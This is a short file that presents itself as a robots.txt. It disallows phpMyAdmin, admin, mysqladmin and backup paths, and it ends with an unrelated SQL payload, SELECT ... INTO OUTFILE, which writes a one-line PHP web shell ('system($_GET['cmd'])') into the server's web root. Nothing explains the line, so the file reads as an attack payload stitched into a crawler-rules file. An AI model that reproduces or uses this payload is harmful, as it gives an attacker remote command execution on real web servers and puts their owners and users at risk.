User-agent: *

Allow: /
Disallow: /phpmyadmin
Disallow: /admin
Disallow: /mysqladmin
Disallow: /backup/



SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/webshell.php"


